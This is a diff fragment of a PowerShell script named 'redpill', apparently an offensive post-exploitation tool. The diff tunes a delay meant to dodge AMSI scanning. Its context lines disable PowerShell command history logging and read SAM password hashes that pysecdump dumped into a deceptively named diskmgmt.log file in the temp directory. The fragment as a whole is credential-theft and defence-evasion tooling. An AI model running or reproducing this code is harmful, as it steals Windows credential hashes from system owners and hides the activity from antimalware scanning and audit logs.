@@ -57,7 +57,7 @@
 )
 
 
-$DelayTime = "15" ## Delay in case amsi starts to scan exec!
+$DelayTime = "14" ## Delay in case amsi starts to scan exec!
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -114,13 +114,13 @@ If($GetPasswords -ieq "Enum"){
          cd $Working_Directory ## Return to redpill working directory
 
          ## Read pysecdump logfile { diskmgmt.log }
+         Start-Sleep -Seconds $DelayTime ## Give some time in case amsi starts to scan execution!
          If(-not(Test-Path -Path "$Env:TMP\diskmgmt.log" -EA SilentlyContinue)){
 
             Write-Host "[error] fail to retrieve SAM hashs! (diskmgmt.log)" -ForegroundColor Red -BackgroundColor Black
 
          }Else{## Read pysecdump logfile { diskmgmt.log }
 
-            Start-Sleep -Seconds 15 ## Give some time in case amsi starts to scan execution!
             Get-Content -Path "$Env:TMP\diskmgmt.log" -EA SilentlyContinue | Select-Object -Skip 4
 
          }
